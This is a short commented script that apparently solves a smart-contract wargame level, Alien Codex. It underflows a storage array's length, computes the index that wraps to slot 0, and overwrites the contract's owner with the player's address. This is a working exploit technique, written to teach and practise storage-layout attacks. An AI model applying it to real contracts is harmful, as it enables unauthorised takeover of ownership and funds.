//check ownership

await contract.owner()

//this doesn't work with the expected error: caller is not the owner
await contract.transferOwnership(player)


//start by making contact
await contract.make_contact()

//Cause an underflow for codex array length
await contract.retract()

// now we need to find the index of the owner variable relative to the array memory location

//the location of the owner variable is at storage slot 0
//the storage slot of the array length is 1
//the location of the array is given by keccak256(<storageSlotOfArrayLength>) = keccak256(1)

let arrayLoc = web3.utils.toBN(web3.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"))

let max = web3.utils.toBN("0x10000000000000000000000000000000000000000000000000000000000000000")

let index = (max.sub(arrayLoc));

let paddedPlayer = "0x000000000000000000000000"+player.substr(2)

// now update the storage slot storing the owner!
await contract.revise(index, paddedPlayer)

//verify the owner has changed 
await contract.owner()